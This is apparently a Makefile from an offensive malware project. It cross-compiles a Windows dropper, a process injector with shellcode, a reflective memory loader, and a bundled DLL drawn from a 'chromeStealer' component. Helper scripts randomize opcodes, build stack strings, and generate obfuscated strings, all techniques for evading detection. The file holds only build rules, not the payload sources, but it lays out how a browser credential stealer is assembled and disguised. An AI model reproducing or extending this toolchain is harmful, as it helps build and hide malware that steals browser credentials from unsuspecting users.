CROSS_CC=x86_64-w64-mingw32-gcc
# https://nullprogram.com/blog/2016/01/31/
CFLAGS=-DNDEBUG
FREESTANDING=-ffreestanding -nostdlib -mconsole -mno-stack-arg-probe -Xlinker --stack=0x100000,0x100000 -Os -DFREESTANDING
ifeq ($(OS),Windows_NT)
	PYTHON=py
else
	PYTHON=python3
endif

dropper.exe: dropper.c opcodes.h strings.h mmLoader.o
	$(CROSS_CC) $(FREESTANDING) $(CFLAGS) -o $@ dropper.c mmLoader.o $(LDFLAGS)
	strip $@

test_dll.dll: test_dll.c
	$(CROSS_CC) $(CFLAGS) -shared -o $@ $^ $(LDFLAGS)

bundled_main_dll.c: chromeStealer_ground/main/main_dll.dll bundll.py
	$(PYTHON) bundll.py $< FooBar > $@

bundled_main_dll.dll: bundled_main_dll.c mmLoader.o
	$(CROSS_CC) $(FREESTANDING) -e DllMain $(CFLAGS) -shared -o $@ $^ $(LDFLAGS)
	strip $@

mmLoader.o: mmLoader.c mmLoader.h
	$(CROSS_CC) $(FREESTANDING) $(CFLAGS) -c -o $@ $<

opcodes.h: randopcode.py
	$(PYTHON) $< > $@

strings.inc: gen_stack_strings.py
	$(PYTHON) $< > $@

shellcode.o: shellcode.c strings.inc
	$(CROSS_CC) $(FREESTANDING) -fPIC $(CFLAGS) -c -o $@ $<

injector.exe: injector.c shellcode.o
	$(CROSS_CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
	strip $@

noimport.exe: noimport.c
	$(CROSS_CC) $(FREESTANDING) $(CFLAGS) -o $@ $^ $(LDFLAGS)

strings.h: vmboxgen.py
	$(PYTHON) $< $@

clean:
	rm -f strings.h opcodes.h *.exe *.dll *.o

.PHONY: clean
